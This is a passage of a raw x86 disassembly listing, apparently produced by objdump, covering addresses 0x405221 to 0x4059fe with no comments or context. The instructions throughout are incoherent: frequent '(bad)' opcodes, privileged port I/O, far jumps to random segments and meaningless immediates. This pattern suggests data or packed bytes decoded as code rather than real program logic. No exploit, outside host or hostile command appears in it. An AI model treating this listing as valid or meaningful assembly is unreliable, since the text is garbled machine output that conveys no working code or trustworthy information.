  405221:	or     BYTE PTR [edx-0x2a],dl
  405224:	ret    
  405225:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  405227:	xor    cl,BYTE PTR [ebp-0x61]
  40522a:	mov    esp,0xcf742fdd
  40522f:	push   0x30
  405231:	ret    
  405232:	inc    edi
  405233:	jge    0x405288
  405235:	(bad)  
  405236:	fimul  WORD PTR [ebx+0x3a]
  405239:	in     eax,0xf
  40523b:	xchg   edx,eax
  40523c:	int    0xaa
  40523e:	or     al,BYTE PTR [eax+eiz*1+0x62b1f5d2]
  405245:	daa    
  405246:	(bad)  
  405247:	xor    al,dh
  405249:	shr    DWORD PTR [esi+0x66da614],1
  40524f:	pop    ss
  405250:	hlt    
  405251:	jmp    0xcdef1b5f
  405256:	push   ecx
  405257:	fcom   DWORD PTR [ebp-0x5251c4e8]
  40525d:	ret    
  40525e:	pop    es
  40525f:	sahf   
  405260:	adc    BYTE PTR cs:[ebp-0x1c6bc024],cl
  405267:	leave  
  405268:	test   BYTE PTR [esi],0x24
  40526b:	sub    al,dh
  40526d:	retf   
  40526e:	jo     0x4052b0
  405270:	pop    ds
  405271:	mov    DWORD PTR [edx],edi
  405273:	pop    ebp
  405274:	loopne 0x4052e1
  405276:	xor    DWORD PTR [esi+0x64],eax
  405279:	dec    edi
  40527a:	popa   
  40527b:	out    dx,al
  40527c:	pop    ds
  40527d:	jnp    0x405228
  40527f:	in     eax,0xec
  405281:	scas   al,BYTE PTR es:[edi]
  405282:	add    al,0xf3
  405284:	sub    ebx,DWORD PTR [edi+0x26]
  405287:	push   ebp
  405288:	jb     0x40521b
  40528a:	mov    ecx,0xe5559638
  40528f:	pop    ebx
  405290:	xor    al,0x7c
  405292:	dec    esi
  405293:	push   ebx
  405294:	push   es
  405295:	scas   eax,DWORD PTR es:[edi]
  405296:	call   0xb6e8:0x27adb225
  40529d:	adc    ebx,DWORD PTR [eax+0x5d29703b]
  4052a3:	push   edx
  4052a4:	push   ss
  4052a5:	bound  esp,QWORD PTR [ebx-0x5a]
  4052a8:	(bad)  
  4052a9:	mov    BYTE PTR [ecx],bh
  4052ab:	sub    ch,BYTE PTR [esi+0x41]
  4052ae:	xor    edx,ecx
  4052b0:	rcr    BYTE PTR [edi+0x76],0x93
  4052b4:	push   ebp
  4052b5:	jb     0x40528a
  4052b7:	pushf  
  4052b8:	shl    ah,1
  4052ba:	shr    bh,0x31
  4052bd:	jle    0x405328
  4052bf:	jecxz  0x4052d9
  4052c1:	fcomp  st(2)
  4052c3:	gs mov eax,0x48e03ff1
  4052c9:	bound  ecx,QWORD PTR [edx+0x54]
  4052cc:	jmp    esi
  4052ce:	cmp    edi,edi
  4052d0:	sub    BYTE PTR [ebx],al
  4052d2:	jmp    0x40529d
  4052d4:	xor    ch,bl
  4052d6:	jmp    0xb77a40bc
  4052db:	neg    DWORD PTR [eax-0x6ff62188]
  4052e1:	mov    eax,ds:0x771d2345
  4052e6:	mov    ah,0x4f
  4052e8:	(bad)  [ecx+ebx*2]
  4052eb:	xchg   ebx,eax
  4052ec:	ret    0x4e6
  4052ef:	push   0xd48e672c
  4052f4:	sub    edi,ebx
  4052f6:	mov    ds:0x74748d7f,eax
  4052fb:	fdiv   QWORD PTR [edx]
  4052fd:	(bad)  
  4052fe:	mov    eax,0x7e176b8e
  405303:	in     al,0xf9
  405305:	or     DWORD PTR ds:0x351d4875,esi
  40530b:	addr16 sbb ch,dh
  40530e:	sbb    eax,0xca09615c
  405313:	mov    eax,ds:0xed02cdca
  405318:	arpl   WORD PTR [esi-0x4f9ca706],si
  40531e:	rcl    ch,cl
  405320:	(bad)  
  405321:	mov    edx,0x849e890d
  405326:	out    0xce,eax
  405328:	adc    eax,0xb9272582
  40532d:	loopne 0x4052bf
  40532f:	pop    ecx
  405330:	mov    bh,0xac
  405332:	fisub  WORD PTR [esp+esi*2+0xd]
  405336:	sub    ah,ah
  405338:	daa    
  405339:	dec    ebx
  40533a:	jns    0x405319
  40533c:	sub    eax,0x5bfed96f
  405341:	int3   
  405342:	jno    0x405352
  405344:	(bad)  
  405345:	cmp    dl,BYTE PTR [ebx+0x8212b7f]
  40534b:	popf   
  40534c:	mov    BYTE PTR [eax+0xb1a65cb],dl
  405352:	imul   edx,DWORD PTR [esp+esi*2],0xffffffc6
  405356:	mov    ds:0xae7698ef,al
  40535b:	test   DWORD PTR [ebx-0x79],edi
  40535e:	(bad)  
  40535f:	sti    
  405360:	js     0x4053d2
  405362:	push   cs
  405363:	or     eax,esp
  405365:	retf   
  405366:	push   esi
  405367:	ret    0x5c7d
  40536a:	mov    ah,0x8
  40536c:	xor    BYTE PTR [eax-0x1a5f2a50],dh
  405372:	fidivr DWORD PTR [edi]
  405374:	in     ax,0x50
  405377:	inc    edi
  405378:	(bad)  
  40537a:	aam    0xc2
  40537c:	je     0x405311
  40537e:	add    DWORD PTR [eax+ecx*1],esi
  405381:	push   cs
  405382:	and    bh,BYTE PTR [esp+eiz*8]
  405385:	jnp    0x4053de
  405387:	popa   
  405388:	arpl   WORD PTR [ebx-0x3a],ax
  40538b:	scas   eax,DWORD PTR es:[edi]
  40538c:	imul   edx,DWORD PTR [edx+0x27128b0a],0xffffffd9
  405393:	scas   al,BYTE PTR es:[edi]
  405394:	fnstenv [edx+0x8]
  405397:	cmp    al,BYTE PTR ss:[ebx-0x4811619e]
  40539e:	xchg   edx,eax
  40539f:	stos   BYTE PTR es:[edi],al
  4053a0:	lods   al,BYTE PTR ds:[esi]
  4053a1:	fmul   QWORD PTR [bp+si+0x18db]
  4053a6:	rol    DWORD PTR [edx+0x9],cl
  4053a9:	mov    fs,WORD PTR [eax+0x27781116]
  4053af:	std    
  4053b0:	(bad)  
  4053b1:	push   cs
  4053b2:	and    DWORD PTR [esi*8-0x1d59e6c3],0x42d4b8b7
  4053bd:	pop    edi
  4053be:	ins    BYTE PTR es:[edi],dx
  4053bf:	mov    ch,0xe5
  4053c1:	mov    eax,ds:0x549765c2
  4053c6:	push   ebp
  4053c7:	outs   dx,DWORD PTR ds:[esi]
  4053c8:	push   DWORD PTR [eax+0x2e]
  4053cb:	hlt    
  4053cc:	frstor [edi-0x274813ba]
  4053d2:	call   0x3fed:0x15264577
  4053d9:	jns    0x40537c
  4053db:	sbb    BYTE PTR [edx+0x20],ah
  4053de:	jno    0x4053e9
  4053e0:	add    BYTE PTR [ebx+0xa],dh
  4053e3:	mov    edi,0xeb8e895
  4053e8:	popf   
  4053e9:	jne    0x4053ed
  4053eb:	scas   eax,DWORD PTR es:[edi]
  4053ec:	das    
  4053ed:	xchg   edi,eax
  4053ee:	aad    0x36
  4053f0:	push   ss
  4053f1:	or     DWORD PTR [edx-0x18],esp
  4053f4:	mov    al,0xe0
  4053f6:	lahf   
  4053f7:	mov    ebp,0x95707431
  4053fc:	mov    BYTE PTR [edi-0x59],0x47
  405400:	or     esi,DWORD PTR [edx-0x22c3fa19]
  405406:	mov    BYTE PTR [eax],ch
  405408:	cli    
  405409:	lods   al,BYTE PTR ds:[esi]
  40540a:	das    
  40540b:	test   DWORD PTR [eax],0x8864b446
  405411:	repnz scas al,BYTE PTR es:[edi]
  405413:	jno    0x4053f7
  405415:	xchg   edi,eax
  405416:	add    ch,0x54
  405419:	jg     0x4053a8
  40541b:	sahf   
  40541c:	addr16 pop edx
  40541e:	xor    al,0x3
  405420:	inc    ebx
  405421:	pusha  
  405422:	and    al,0xcf
  405424:	or     bh,dl
  405426:	nop
  405427:	fldcw  WORD PTR [eax]
  405429:	or     eax,0x58776b29
  40542e:	pusha  
  40542f:	lea    esi,[eax-0x1d]
  405432:	jmp    FWORD PTR [eax]
  405434:	xchg   ebp,eax
  405435:	imul   ebp,DWORD PTR [edx+0x23],0xf78778bd
  40543c:	xchg   BYTE PTR [ecx],al
  40543e:	leave  
  40543f:	mov    esp,0x7474ab88
  405444:	repz pop ss
  405446:	xchg   BYTE PTR [edx+ecx*2-0x1a],cl
  40544a:	xchg   BYTE PTR [edi],bh
  40544c:	mov    ecx,0xf0af7960
  405451:	cmc    
  405452:	mov    dl,0x39
  405454:	rcl    BYTE PTR cs:[ecx-0x7c],cl
  405458:	stos   BYTE PTR es:[edi],al
  405459:	loop   0x4054ce
  40545b:	out    dx,al
  40545c:	xor    al,dh
  40545e:	xchg   ebx,eax
  40545f:	cdq    
  405460:	xchg   esi,esi
  405462:	sub    al,0xeb
  405464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405465:	es dec edi
  405467:	outs   dx,BYTE PTR ds:[esi]
  405468:	push   cs
  405469:	sub    DWORD PTR [esi+0x47d1f814],0x3ea9fa8c
  405473:	jl     0x405459
  405475:	xchg   edx,eax
  405476:	ret    0xec2
  405479:	repz push esi
  40547b:	ins    BYTE PTR es:[edi],dx
  40547c:	mov    bl,0xad
  40547e:	icebp  
  40547f:	lock popa 
  405481:	retf   0x60d5
  405484:	lock bound edi,QWORD PTR [ebx+0x8]
  405488:	add    DWORD PTR [eax],edx
  40548a:	pop    ecx
  40548b:	cmp    dh,BYTE PTR [edi+ebx*2+0x4597fc8b]
  405492:	mul    eax
  405494:	aad    0x9d
  405496:	mov    esi,0x282984f7
  40549b:	leave  
  40549c:	lock sub dl,bl
  40549f:	mov    ch,0xde
  4054a1:	cmp    al,bl
  4054a3:	xor    ch,dl
  4054a5:	jbe    0x4054a2
  4054a7:	mov    ebp,0x95e237cf
  4054ac:	sti    
  4054ad:	fcomp  st(5)
  4054af:	outs   dx,BYTE PTR ds:[esi]
  4054b0:	out    0xa2,al
  4054b2:	test   al,0xf4
  4054b4:	jbe    0x40550b
  4054b6:	sar    BYTE PTR [edi],cl
  4054b8:	mov    esi,0x8047721c
  4054bd:	dec    esi
  4054be:	add    esp,ebx
  4054c0:	test   DWORD PTR [edi-0x1d0e1c68],ecx
  4054c6:	mov    al,BYTE PTR ds:0xe690d45d
  4054cc:	scas   al,BYTE PTR es:[edi]
  4054cd:	and    eax,0xc42488ed
  4054d2:	xlat   BYTE PTR ds:[ebx]
  4054d3:	inc    ecx
  4054d4:	mov    ebx,0x25c5da31
  4054d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054da:	sbb    BYTE PTR [edx+edi*1-0x8],ah
  4054de:	mov    eax,ds:0xe7d1d291
  4054e3:	cld    
  4054e4:	cmp    ecx,DWORD PTR cs:[edi-0x6fc4c8f0]
  4054eb:	(bad)  
  4054ec:	out    0xba,eax
  4054ee:	ret    
  4054ef:	dec    edi
  4054f0:	maskmovq mm7,(bad)
  4054f1:	idiv   DWORD PTR [edx-0x70b64992]
  4054f7:	jp     0x405541
  4054f9:	sbb    ecx,DWORD PTR [esi-0x47e02669]
  4054ff:	popf   
  405500:	sub    ch,cl
  405502:	in     al,dx
  405503:	cmc    
  405504:	sub    eax,0xd12a0a2f
  405509:	push   ebx
  40550a:	mov    dh,0x5f
  40550c:	dec    ebx
  40550d:	adc    bh,BYTE PTR [esi]
  40550f:	adc    dl,bl
  405511:	inc    esp
  405512:	inc    ecx
  405513:	lock clc 
  405515:	mov    dh,0xb0
  405517:	push   edi
  405518:	sub    bl,BYTE PTR [eax]
  40551a:	rcl    DWORD PTR [edx+0x5a],1
  40551d:	mov    eax,0xa2181db4
  405522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405523:	stc    
  405524:	cwde   
  405525:	xchg   BYTE PTR [esp+edx*1],al
  405528:	cld    
  405529:	mov    ebp,0x7d17e78e
  40552e:	jnp    0x40559a
  405530:	or     bl,0xad
  405533:	mov    DWORD PTR [edx-0x11],ebx
  405536:	out    dx,al
  405537:	hlt    
  405538:	mov    ds,WORD PTR [eax+ebx*8+0x7f]
  40553c:	mov    bh,0x5e
  40553e:	es aas 
  405540:	inc    ebp
  405541:	and    ecx,DWORD PTR [ecx-0x1e2d824c]
  405547:	in     al,0xb0
  405549:	nop
  40554a:	addr16 pop esp
  40554c:	xchg   BYTE PTR [esi-0x65],dl
  40554f:	jl     0x40555f
  405551:	add    ecx,esi
  405553:	xor    edx,DWORD PTR [ecx+edi*8]
  405556:	repnz sbb al,0x21
  405559:	jl     0x40558c
  40555b:	xchg   ebp,eax
  40555c:	repnz dec eax
  40555e:	push   esi
  40555f:	in     eax,0x41
  405561:	(bad)  
  405562:	xor    esp,DWORD PTR [ecx+0x5d1211d6]
  405568:	inc    eax
  405569:	sti    
  40556a:	outs   dx,BYTE PTR ds:[esi]
  40556b:	xchg   DWORD PTR ds:0x2d06220f,esi
  405571:	cmp    edx,DWORD PTR [ecx-0x67986a84]
  405577:	test   al,0xc5
  405579:	adc    eax,0x5b34751e
  40557e:	cmp    edi,esp
  405580:	mov    al,ds:0x7e7095f
  405585:	sub    al,0xbc
  405587:	cmc    
  405588:	outs   dx,BYTE PTR ds:[esi]
  405589:	shr    DWORD PTR [edx-0x4a],cl
  40558c:	mov    eax,ds:0x2d9c5f65
  405591:	xchg   ebp,eax
  405592:	sti    
  405593:	(bad)  
  405595:	jmp    0x4055fb
  405597:	les    edi,FWORD PTR [ecx]
  405599:	inc    ebp
  40559a:	jg     0x4055a8
  40559c:	ret    0xe0f1
  40559f:	push   es
  4055a0:	pop    esp
  4055a1:	xchg   BYTE PTR [esi],bl
  4055a3:	pop    edx
  4055a4:	push   cs
  4055a5:	sar    BYTE PTR [edx-0x1e],1
  4055a8:	dec    esp
  4055a9:	cld    
  4055aa:	addr16 icebp 
  4055ac:	or     edx,edx
  4055ae:	stc    
  4055af:	mov    eax,0xe5536143
  4055b4:	lock pop ecx
  4055b6:	aad    0x63
  4055b8:	add    BYTE PTR [edi+0x691d003b],bl
  4055be:	test   eax,0xff373d32
  4055c3:	daa    
  4055c4:	loop   0x4055fc
  4055c6:	cs mov esp,0xcf0e93c3
  4055cc:	mov    DWORD PTR [ecx-0x4e],esi
  4055cf:	jae    0x4055eb
  4055d1:	(bad)  
  4055d2:	loopne 0x40556c
  4055d4:	mov    DWORD PTR [ebp-0x1f],edi
  4055d7:	fstp   TBYTE PTR [eax+0x2d]
  4055da:	jge    0x40560e
  4055dc:	and    eax,0x235e9253
  4055e1:	addr16 (bad) 
  4055e3:	ror    ecx,1
  4055e5:	xor    DWORD PTR [edi],esi
  4055e7:	dec    ebx
  4055e8:	xchg   ecx,eax
  4055e9:	mov    dh,0x19
  4055eb:	mov    ah,0x2f
  4055ed:	add    eax,0x1733c810
  4055f2:	jmp    FWORD PTR [ebx]
  4055f4:	out    0x13,eax
  4055f6:	and    al,0xb1
  4055f8:	adc    al,0xd0
  4055fa:	pop    edi
  4055fb:	pop    edx
  4055fc:	bound  eax,QWORD PTR [edx-0x32]
  4055ff:	icebp  
  405600:	sbb    ebx,DWORD PTR [edi-0x3f]
  405603:	dec    BYTE PTR [esi]
  405605:	mov    bh,0xba
  405607:	in     al,dx
  405608:	lahf   
  405609:	add    BYTE PTR [edi-0x26],0xbc
  40560d:	xchg   edi,eax
  40560e:	sub    DWORD PTR [ebp-0x28],ebp
  405611:	mov    ebp,0x4a5dcaa4
  405616:	or     eax,0x8377f96e
  40561b:	std    
  40561c:	test   eax,0xd05dc019
  405621:	clc    
  405622:	sub    al,0x47
  405624:	call   0x415f:0xad1165de
  40562b:	and    BYTE PTR [ecx+ecx*4+0x29],cl
  40562f:	test   DWORD PTR [eax-0x47adc6e8],esi
  405635:	xchg   dh,dh
  405637:	leave  
  405638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405639:	dec    esi
  40563a:	xor    al,0x64
  40563c:	into   
  40563d:	cmp    edx,DWORD PTR [eax]
  40563f:	push   ebp
  405640:	aad    0xf9
  405642:	mov    esp,0xb21ffbae
  405647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405648:	out    dx,eax
  405649:	(bad)  
  40564a:	and    al,0xf6
  40564c:	xchg   edi,eax
  40564d:	scas   al,BYTE PTR es:[edi]
  40564e:	add    al,0x7e
  405650:	pushf  
  405651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405652:	push   edx
  405653:	cmp    DWORD PTR [ecx-0x5f019dc2],ebp
  405659:	adc    edx,edx
  40565b:	(bad)  
  40565c:	ja     0x405619
  40565e:	xchg   esi,eax
  40565f:	or     DWORD PTR [edx],ebx
  405661:	enter  0x8ca5,0xbb
  405665:	mov    cs,WORD PTR [ebp-0x6d]
  405668:	and    ebx,esi
  40566a:	into   
  40566b:	ret    
  40566c:	ds jle 0x40566a
  40566f:	inc    esi
  405670:	sub    DWORD PTR [esi+0x60f02cad],0x2905e16a
  40567a:	sub    BYTE PTR [edx+0x11a1a013],dh
  405680:	mov    ch,0x79
  405682:	jae    0x40560c
  405684:	jp     0x405667
  405686:	pop    ss
  405687:	dec    ecx
  405688:	xor    dl,BYTE PTR [ecx+0x1cdef16f]
  40568e:	push   ebp
  40568f:	nop
  405690:	outs   dx,BYTE PTR ds:[esi]
  405691:	xchg   esi,eax
  405692:	mov    ss,WORD PTR [esi]
  405694:	lock cmp al,0xdc
  405697:	shr    al,cl
  405699:	or     al,0x1
  40569b:	mov    dl,0xc5
  40569d:	mov    cl,0x4
  40569f:	sub    dh,BYTE PTR fs:[ecx-0x57]
  4056a3:	pop    ss
  4056a4:	lods   al,BYTE PTR ds:[esi]
  4056a5:	jle    0x4056a3
  4056a7:	scas   al,BYTE PTR es:[edi]
  4056a8:	pusha  
  4056a9:	int    0x34
  4056ab:	cmp    DWORD PTR [ebp-0x1a94cdf4],ecx
  4056b1:	retf   0x2f76
  4056b4:	jmp    0x998f:0x86cb5f81
  4056bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056bc:	mov    bh,0x8
  4056be:	push   ecx
  4056bf:	push   cs
  4056c0:	rcl    BYTE PTR [ebp+0x7bb0ef90],cl
  4056c6:	add    esi,eax
  4056c8:	sar    DWORD PTR [edi+0x7a7f53d4],cl
  4056ce:	das    
  4056cf:	loop   0x405734
  4056d1:	push   DWORD PTR [eax]
  4056d3:	adc    DWORD PTR [esi+0x54],ecx
  4056d6:	fsubr  st(1),st
  4056d8:	pusha  
  4056d9:	mov    esp,0xd6f39bb0
  4056de:	xor    bh,dh
  4056e0:	push   es
  4056e1:	popa   
  4056e2:	sub    ecx,ebp
  4056e4:	mov    ds:0x4ee13ad0,eax
  4056e9:	ret    
  4056ea:	sbb    BYTE PTR [edx+0xd],dh
  4056ed:	mov    ecx,0x2b7d0aa3
  4056f2:	cld    
  4056f3:	sbb    ecx,eax
  4056f5:	pop    ds
  4056f6:	arpl   bx,si
  4056f8:	xchg   ecx,eax
  4056f9:	dec    BYTE PTR [eax+0x3a]
  4056fc:	mov    eax,ds:0xb1b3da13
  405701:	inc    esp
  405702:	inc    edx
  405703:	dec    ebx
  405704:	popf   
  405705:	and    al,0x9d
  405707:	cmc    
  405708:	popf   
  405709:	pop    ds
  40570a:	mov    bh,0xe3
  40570c:	fcmovne st,st(6)
  40570e:	xor    eax,0x35b4239b
  405713:	add    al,0x9
  405715:	fcmovnbe st,st(2)
  405717:	mov    ecx,0x3dd53c93
  40571c:	scas   eax,DWORD PTR es:[edi]
  40571d:	scas   al,BYTE PTR es:[edi]
  40571e:	dec    ebx
  40571f:	popfw  
  405721:	adc    DWORD PTR [ebx],esi
  405723:	cmp    edi,DWORD PTR [edx-0x61]
  405726:	cmp    bh,ah
  405728:	dec    ebx
  405729:	or     ebx,DWORD PTR [ecx*8+0x37e49d4b]
  405730:	push   esi
  405731:	and    eax,0xe5f4d09c
  405736:	sbb    ah,bl
  405738:	in     al,0x12
  40573a:	or     dl,BYTE PTR [ebp-0x77]
  40573d:	aaa    
  40573e:	sub    edx,DWORD PTR [eax+ebp*4-0x427704e7]
  405745:	aad    0x8c
  405747:	push   ebx
  405748:	sub    DWORD PTR [ebx+0x3bf25c15],esp
  40574e:	sbb    BYTE PTR [esi+0x9],0xfd
  405752:	popa   
  405753:	pusha  
  405754:	jmp    0x60578d7b
  405759:	retf   0x6691
  40575c:	and    DWORD PTR [edx-0x77],edi
  40575f:	rol    BYTE PTR [esi+ebx*8-0x619b70e],1
  405766:	xor    ch,al
  405768:	and    al,0x49
  40576a:	xchg   ecx,eax
  40576b:	mov    al,0x11
  40576d:	xor    al,0x1c
  40576f:	aas    
  405770:	push   edx
  405771:	fnsave [ebx-0xa2f1880]
  405777:	inc    ebx
  405778:	push   esp
  405779:	loopne 0x405785
  40577b:	add    dh,dl
  40577d:	(bad)  
  40577e:	xchg   esi,eax
  40577f:	xor    DWORD PTR [esi-0x49],edi
  405782:	(bad)
  405785:	or     al,0xbd
  405787:	push   ebp
  405788:	mov    eax,0xb5925d50
  40578d:	mov    dh,0xe7
  40578f:	pop    ebp
  405790:	mov    bl,0x25
  405792:	push   ebp
  405793:	jb     0x405800
  405795:	inc    esi
  405796:	cmovs  esi,DWORD PTR [edi+ecx*8-0x211378c9]
  40579e:	retf   0xb323
  4057a1:	int    0x29
  4057a3:	gs pop esi
  4057a5:	adc    dl,BYTE PTR [esi+0x42b99f3d]
  4057ab:	test   BYTE PTR [ebx],ah
  4057ad:	ja     0x405828
  4057af:	bound  eax,QWORD PTR [esp+ebx*2-0x1c5b3c73]
  4057b6:	pop    edi
  4057b7:	jnp    0x4057c5
  4057b9:	lahf   
  4057ba:	les    ecx,FWORD PTR [ebx-0x495bf142]
  4057c0:	add    ecx,DWORD PTR [ebp+0x46]
  4057c3:	jl     0x4057e2
  4057c5:	clc    
  4057c6:	test   edi,esp
  4057c8:	and    al,0x7b
  4057ca:	mov    DWORD PTR [ebx+0x3d],0x7ede301b
  4057d1:	sub    DWORD PTR [ecx-0x610cbe6b],eax
  4057d7:	mov    dl,ch
  4057d9:	or     al,0xb4
  4057db:	iret   
  4057dc:	mov    eax,0x17fd5fee
  4057e1:	pop    ebx
  4057e2:	xor    eax,0x556a65dc
  4057e7:	sbb    al,0xc7
  4057e9:	ret    
  4057ea:	(bad)  
  4057eb:	jle    0x405794
  4057ed:	fst    DWORD PTR [edx-0x61a73f8]
  4057f3:	cmp    ah,BYTE PTR [eax-0xf3301db]
  4057f9:	dec    eax
  4057fa:	shr    BYTE PTR [esi-0x29245f6a],1
  405800:	jo     0x405854
  405802:	adc    BYTE PTR [eax+0x61ebe6d1],al
  405808:	std    
  405809:	in     al,dx
  40580a:	or     al,0x83
  40580c:	inc    ecx
  40580d:	mov    ebx,0xb7ec3eb
  405812:	dec    esi
  405813:	scas   al,BYTE PTR es:[edi]
  405814:	pop    eax
  405815:	xchg   edx,eax
  405816:	and    BYTE PTR [ebp-0x498ea43],bl
  40581c:	cmp    BYTE PTR [ebx-0x61],dh
  40581f:	pop    ebx
  405820:	rcr    BYTE PTR [ecx],0xcb
  405823:	scas   eax,DWORD PTR es:[edi]
  405824:	test   bh,bh
  405826:	add    BYTE PTR [esp+edi*2-0x40241bb7],cl
  40582d:	(bad)  
  40582e:	jae    0x4058a3
  405830:	fcomp  DWORD PTR [edx]
  405832:	push   edx
  405833:	mov    ecx,0x2d0cb1b0
  405838:	test   al,0x7f
  40583a:	les    esi,FWORD PTR ds:0xc9945aba
  405840:	jecxz  0x40582b
  405842:	pop    ebx
  405843:	mov    gs,ebp
  405845:	popf   
  405846:	sub    DWORD PTR [ebx+0xb221980],ebx
  40584c:	out    dx,al
  40584d:	div    esp
  40584f:	jno    0x4057fd
  405851:	pop    ebx
  405852:	stc    
  405853:	iret   
  405854:	cmp    al,BYTE PTR [edi]
  405856:	(bad)  
  405857:	aad    0x85
  405859:	or     BYTE PTR [edx+0x6c],dl
  40585c:	inc    edx
  40585d:	mov    ds:0xf66fad4,eax
  405862:	mov    dl,0x55
  405864:	sub    BYTE PTR [edi],al
  405866:	adc    DWORD PTR [ecx-0x2b7f2b79],0xc394bdbb
  405870:	shr    BYTE PTR [ebx],cl
  405872:	xchg   esp,eax
  405873:	inc    edi
  405874:	test   cl,dl
  405876:	jle    0x40581d
  405878:	pushaw 
  40587a:	xor    ebp,DWORD PTR [ebp+0x3f]
  40587d:	repnz xor al,0x18
  405880:	sub    al,0x62
  405882:	jg     0x405829
  405884:	cdq    
  405885:	xchg   edx,eax
  405886:	sub    eax,0xc2f9c7cf
  40588b:	dec    esp
  40588c:	fst    QWORD PTR [edi+0x42]
  40588f:	aas    
  405890:	pop    esp
  405891:	ret    0x1e06
  405894:	xor    al,0x2c
  405896:	xchg   BYTE PTR [esi+0x3fb92745],cl
  40589c:	and    BYTE PTR [edi+edi*4+0x7f],0x78
  4058a1:	fistp  QWORD PTR [ebx+0x62]
  4058a4:	mov    bh,0x58
  4058a6:	leave  
  4058a7:	ror    DWORD PTR [edx+0x54],0x93
  4058ab:	and    BYTE PTR [ebx],ah
  4058ad:	mov    ebp,0xce02a4eb
  4058b2:	leave  
  4058b3:	push   es
  4058b4:	lahf   
  4058b5:	pushf  
  4058b6:	stc    
  4058b7:	jp     0x405921
  4058b9:	ja     0x405906
  4058bb:	sbb    al,0x59
  4058bd:	mov    eax,ds:0xb8b36b84
  4058c2:	icebp  
  4058c3:	retf   0x1c98
  4058c6:	aas    
  4058c7:	pop    es
  4058c8:	mov    eax,ds:0x36c09a79
  4058cd:	or     ebx,DWORD PTR [ecx+0x55]
  4058d0:	pop    edx
  4058d1:	adc    al,0x72
  4058d3:	cmp    BYTE PTR [ebx],0xe5
  4058d6:	jp     0x4058e2
  4058d8:	setl   BYTE PTR [ebx+0x3e168c56]
  4058df:	pop    ebx
  4058e0:	lods   eax,DWORD PTR ds:[esi]
  4058e1:	mov    ebp,0xe5c68933
  4058e6:	xchg   ebp,eax
  4058e7:	iret   
  4058e8:	dec    esi
  4058e9:	push   edi
  4058ea:	aam    0xc9
  4058ec:	bound  edi,QWORD PTR [eax]
  4058ee:	sti    
  4058ef:	pop    esp
  4058f0:	xchg   esp,eax
  4058f1:	mov    gs,WORD PTR [ebp+0x65]
  4058f4:	loop   0x405897
  4058f6:	sub    al,0x28
  4058f8:	loopne 0x4058d0
  4058fa:	ret    
  4058fb:	pop    esp
  4058fc:	outs   dx,DWORD PTR ds:[esi]
  4058fd:	enter  0x774a,0x80
  405901:	pop    eax
  405902:	fmul   DWORD PTR [edx]
  405904:	lea    esp,[esi-0x474e82ce]
  40590a:	sbb    DWORD PTR cs:[eax+0x29],0x630c1d2c
  405912:	sub    BYTE PTR [edx+0x465a59b9],bl
  405918:	mov    ds:0xb13b1e0,al
  40591d:	sbb    bh,BYTE PTR [esi]
  40591f:	les    ebp,FWORD PTR ds:[edx]
  405922:	mov    esp,?
  405924:	(bad)  
  405925:	retf   
  405926:	cs mov bh,0x2a
  405929:	xchg   esp,eax
  40592a:	fnsave [esi]
  40592c:	sbb    al,0x3
  40592e:	add    dh,BYTE PTR [ebp+0x6ed8241e]
  405934:	stos   BYTE PTR es:[edi],al
  405935:	inc    edi
  405936:	xchg   ecx,eax
  405937:	stos   BYTE PTR es:[edi],al
  405938:	mov    DWORD PTR [edx],edi
  40593a:	sub    BYTE PTR [esp+eax*8-0x2b],0xdf
  40593f:	push   ebp
  405940:	mov    eax,0xfaead019
  405945:	ror    DWORD PTR [edx],0x1f
  405948:	mov    ds:0xb497b490,al
  40594d:	retf   
  40594e:	inc    ebp
  40594f:	out    0x9a,eax
  405951:	mov    esp,0x71da7e82
  405956:	js     0x40590c
  405958:	mov    edx,0xb2260226
  40595d:	xchg   ebx,eax
  40595e:	neg    WORD PTR [eax]
  405961:	push   ds
  405962:	gs pusha 
  405964:	cmp    al,BYTE PTR [ebp-0x60a2d7fa]
  40596a:	sbb    BYTE PTR [ebp+0x7a1b096f],dh
  405970:	mov    ds:0x5e81e014,eax
  405975:	clc    
  405976:	scas   al,BYTE PTR es:[edi]
  405977:	shl    DWORD PTR [ecx],0x49
  40597a:	push   esp
  40597b:	sub    al,0x75
  40597d:	jle    0x405987
  40597f:	or     al,0x5d
  405981:	dec    ebp
  405982:	sbb    esp,DWORD PTR [ebx]
  405984:	sbb    eax,DWORD PTR ds:0xd055fc08
  40598a:	add    esp,DWORD PTR [ebx-0x64411f2e]
  405990:	in     al,0xb3
  405992:	fadd   DWORD PTR [esi+0x5d]
  405995:	mov    ds:0xe637b5b2,al
  40599a:	pop    esi
  40599b:	jae    0x4059a3
  40599d:	data16 fdivr QWORD PTR [ebx+0x464b8f23]
  4059a4:	lahf   
  4059a5:	push   ds
  4059a6:	test   BYTE PTR [esi+0x23d94281],bh
  4059ac:	or     eax,DWORD PTR [esi]
  4059ae:	repnz mov al,ds:0x53d637ca
  4059b4:	push   ebp
  4059b5:	and    bh,BYTE PTR [ebx+0x4ea5ff6c]
  4059bb:	(bad)  
  4059bc:	jl     0x405a34
  4059be:	mov    esi,0x1477f124
  4059c3:	(bad)  
  4059c4:	jmp    0x405a04
  4059c6:	iret   
  4059c7:	xchg   ecx,eax
  4059c8:	inc    ebp
  4059c9:	cdq    
  4059ca:	sbb    ah,BYTE PTR [eax]
  4059cc:	call   0x71e7:0x2cc771d6
  4059d3:	mov    ds:0xf18564d7,al
  4059d8:	fstp   DWORD PTR [ebx]
  4059da:	mov    cl,0x7
  4059dc:	stos   DWORD PTR es:[di],eax
  4059de:	or     BYTE PTR [eax+0x633bbabd],ah
  4059e4:	loope  0x405a45
  4059e6:	dec    ebx
  4059e7:	mov    bh,0x3d
  4059e9:	and    dl,al
  4059eb:	xchg   ecx,eax
  4059ec:	js     0x4059d7
  4059ee:	and    DWORD PTR [esi-0x69],esp
  4059f1:	repnz push cs
  4059f3:	js     0x4059d8
  4059f5:	ins    BYTE PTR es:[edi],dx
  4059f6:	leave  
  4059f7:	pushf  
  4059f8:	stos   BYTE PTR es:[edi],al
  4059f9:	or     BYTE PTR [esi+0x6],bh
  4059fc:	sub    al,0x6b
  4059fe:	pop    edi
